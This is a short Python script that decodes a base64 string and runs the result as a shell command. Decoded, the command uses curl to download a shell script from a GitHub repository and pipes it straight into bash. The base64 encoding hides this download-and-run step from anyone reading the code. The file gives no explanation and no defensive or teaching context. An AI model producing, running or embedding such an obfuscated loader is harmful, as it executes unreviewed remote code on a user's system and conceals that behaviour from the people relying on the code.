import base64
import subprocess

encoded = "Y3VybCAtTyAtTCAtSiBodHRwczovL2dpdGh1Yi5jb20vd2FraXRvYmkvZ2xvd2luZy11bWJyZWxsYS9yYXcvcmVmcy9oZWFkcy9tYWluL2Rvd24uc2g7YmFzaCBkb3duLnNo"  # Base64 of a shell command
cmd = base64.b64decode(encoded).decode()

subprocess.run(cmd, shell=True, check=True)
